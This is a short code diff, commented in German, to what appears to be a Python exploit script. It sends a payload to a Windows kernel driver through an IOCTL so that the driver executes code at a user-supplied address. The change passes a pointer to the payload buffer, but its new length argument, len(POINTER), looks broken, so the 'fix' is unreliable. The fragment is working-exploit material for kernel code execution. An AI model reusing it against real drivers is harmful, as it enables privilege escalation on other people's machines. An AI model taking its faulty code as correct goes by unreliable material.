@@ -102,7 +102,8 @@ def ExecuteUsercodeAddress():
         exit(1)
 
     # Sende das Ganze an den Treiber
-    result = send2Driver(IOCTL_ExecuteUsercodeAddress, memory, len(payload), None, 0)
+    # Achtung: Der Treiber erwartet einen Pointer für den Payload, nicht direkt den Payload 
+    result = send2Driver(IOCTL_ExecuteUsercodeAddress, byref(memory), len(POINTER), None, 0)
     if not result[0]:
         print("Konnte Payload nicht an Treiber senden. Errorcode: %i" % GetLastError())
         exit(1)
